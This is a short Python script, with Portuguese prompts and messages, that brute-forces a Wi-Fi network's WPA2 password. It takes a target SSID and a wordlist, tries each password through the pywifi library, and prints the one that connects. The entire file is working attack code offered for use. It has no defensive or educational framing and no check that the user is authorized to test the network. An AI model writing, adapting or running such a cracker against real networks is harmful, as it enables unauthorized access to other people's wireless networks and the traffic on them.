import pywifi
from pywifi import const
import time

def wifi_test(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.key = password
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        time.sleep(5)
        if iface.status() == const.IFACE_CONNECTED:
            print(f"[+] Conectado com sucesso à rede {ssid} com a senha: {password}")
            iface.disconnect()
            return True
        else:
            print(f"[-] Senha incorreta: {password}")
    return False

def brute_force_test(ssid, wordlist_path):
    with open(wordlist_path, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Tentando senha: {password}")
        if wifi_test(ssid, password):
            print(f"[+] Senha encontrada: {password}")
            break
    else:
        print("[-] Não foi possível encontrar a senha.")

if __name__ == "__main__":
    ssid = input("Digite o nome da rede (SSID): ")
    wordlist_path = input("Digite o caminho da wordlist: ")
    brute_force_test(ssid, wordlist_path)
